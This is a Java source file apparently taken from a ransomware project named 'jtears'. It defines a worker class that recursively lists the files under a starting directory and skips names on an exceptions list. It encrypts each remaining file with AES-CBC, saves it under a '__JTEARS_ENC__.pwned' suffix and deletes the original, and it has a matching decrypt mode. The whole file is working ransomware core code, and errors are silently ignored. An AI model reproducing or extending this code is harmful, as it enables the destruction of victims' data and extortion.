package oof.heck.jtears;

import java.lang.Runnable;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.Cipher;
import javax.crypto.BadPaddingException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import javax.crypto.NoSuchPaddingException;
import java.security.InvalidAlgorithmParameterException;
import java.util.List;
import java.util.LinkedList;
import java.lang.Exception;

class CryptoWorker implements Runnable {

    private Cipher cipher;
    private CryptoModel model;

    private File startFile;
    private String[] exceptions;

    private int mode;
    private List<File> files;

    public CryptoWorker(File start, String[] exceptions, int mode) {

        this.startFile = start;
        this.exceptions = exceptions;
        this.files = new LinkedList<File>();
        this.mode = mode;
        try {

            this.model = CryptoModel.getInstance();
            this.cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            this.cipher.init(mode, model.getSecretKey(), model.getIvSpec());

        } catch (InvalidKeyException      |
                 NoSuchAlgorithmException |
                 NoSuchPaddingException   |
                 InvalidAlgorithmParameterException e)
        {

            throw new RuntimeException("failed to start worker." + e.getMessage());

        }
    }

    private void recurseDirectories(File start) {

        File[] lst = start.listFiles();

        for (File f : lst) {

            if (f.isDirectory()) {

                recurseDirectories(f);

            }

            if (f.isFile()) {

                boolean found = false;

                for (int i = 0; i < this.exceptions.length; i++) {

                    if (f.getName().contains(this.exceptions[i])) {
                        found = true;
                    }

                }

                if (!found)
                    this.files.add(f);

            }

        }

    }

    private void process(String in, String out) throws IllegalBlockSizeException,
                                                       BadPaddingException,
                                                       IOException
    {

        try (FileInputStream inFile = new FileInputStream(in);
             FileOutputStream outFile = new FileOutputStream(out)) {

            byte[] buf = new byte[1024];
            int len;

            while ((len = inFile.read(buf)) != -1) {

                byte[] obuf = this.cipher.update(buf, 0, len);

                if (obuf != null) {

                    outFile.write(obuf);

                }

            }

            byte[] obuf = this.cipher.doFinal();

            if (obuf != null) {

                outFile.write(obuf);

            }

        }

    }

    @Override
    public void run() {

        this.recurseDirectories(this.startFile);

        for (File f : this.files) {

            String n = f.getAbsolutePath();
            try {

                switch (this.mode) {

                    case Cipher.ENCRYPT_MODE:
                        this.process( n, n + "__JTEARS_ENC__.pwned" );
                        f.delete();
                        break;

                    case Cipher.DECRYPT_MODE:
                        this.process(n, n.replace("__JTEARS_ENC__.pwned", ""));
                        f.delete();
                        break;

                }

            } catch (Exception e) {


            }

        }

    }

}
